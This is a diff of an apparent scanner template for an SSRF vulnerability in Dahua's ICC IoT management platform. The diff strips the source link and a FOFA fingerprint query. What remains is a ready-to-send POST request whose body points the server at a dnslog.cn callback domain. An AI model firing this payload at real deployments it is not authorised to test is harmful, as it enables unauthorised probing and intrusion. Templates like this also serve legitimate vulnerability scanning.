@@ -3,12 +3,8 @@ info:
   name: 大华ICC智能物联综合管理平台 mas conn 存在SSRF漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/vrm2bxozibr3gxgd'
+  description: ''
   tags: ssrf,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: vrm2bxozibr3gxgd
-    fofa: body="static/qwebchannel.js" && body="/*客户端会小于800*/"
 http:
 - raw:
   - "POST /evo-apigw/evo-cascade/mas/conn HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nAccept-Encoding: gzip, deflate\nConnection: keep-alive\nContent-Type: application/json\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\n\n{\n  \"masPort\": \"80\",\n  \"masIp\": \"9bp1oi.dnslog.cn\"\n}"
